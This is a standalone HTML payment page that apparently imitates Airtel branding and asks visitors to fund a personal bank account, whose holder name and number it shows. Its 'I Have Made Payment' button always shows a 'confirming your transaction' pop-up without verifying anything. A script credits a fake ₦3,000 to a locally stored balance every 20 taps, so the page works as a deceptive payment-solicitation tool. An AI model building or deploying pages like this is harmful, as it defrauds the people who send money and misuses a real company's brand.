<!DOCTYPE html>
<html>
<head>
  <title>Confirm Payment</title>
  <style>
    body {
      font-family: sans-serif;
      background: url('airtel-bg.png') no-repeat center center fixed;
      background-size: cover;
      margin: 0;
      padding: 0;
    }
    .card {
      max-width: 400px;
      margin: 100px auto;
      background: white;
      border-radius: 20px;
      padding: 20px;
      text-align: center;
      box-shadow: 0 0 10px rgba(0,0,0,0.2);
    }
    .logo {
      width: 60px;
      margin-bottom: 10px;
    }
    button {
      background: red;
      color: white;
      padding: 12px 25px;
      font-size: 16px;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      margin-top: 20px;
    }

    /* Pop-up styles */
    .popup {
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%) scale(0);
      background: white;
      padding: 20px;
      border-radius: 15px;
      box-shadow: 0 0 20px rgba(0,0,0,0.4);
      text-align: center;
      z-index: 999;
      transition: all 0.3s ease;
    }

    .popup.show {
      transform: translate(-50%, -50%) scale(1);
    }

    .popup h3 {
      margin: 0;
      font-size: 18px;
    }

    .popup p {
      font-size: 15px;
      color: #333;
    }

    .popup-icon {
      font-size: 30px;
      color: green;
    }

  </style>
</head>
<body>
  <div class="card">
    <img src="airtel-logo.png" class="logo" alt="Airtel Logo" />
    <h2>Fund Account</h2>
    <p><strong>Account Name:</strong> EMMANUEL OKWUNNA</p>
    <p><strong>Bank:</strong> SmartCash Payment Service Bank</p>
    <p><strong>Account Number:</strong> 812 489 0070</p>
    <button onclick="confirmPayment()">I Have Made Payment</button>
  </div>

  <!-- Pop-up -->
  <div class="popup" id="popup">
    <div class="popup-icon">✅</div>
    <h3>Thank you!</h3>
    <p>Please wait, we are confirming your transaction...</p>
  </div>

  <script>
    let tapCount = localStorage.getItem('tapCount') || 0;

    function confirmPayment() {
      tapCount++;
      localStorage.setItem('tapCount', tapCount);

      // Show the pop-up
      const popup = document.getElementById('popup');
      popup.classList.add('show');

      // Hide after 3 seconds
      setTimeout(() => {
        popup.classList.remove('show');
      }, 3000);

      if (tapCount % 20 === 0) {
        let balance = parseInt(localStorage.getItem('user.balance') || '0');
        balance += 3000;
        localStorage.setItem('user.balance', balance);
        setTimeout(() => {
          alert("₦3,000 has been added to your balance!");
        }, 1000);
      }
    }
  </script>
</body>
</html>
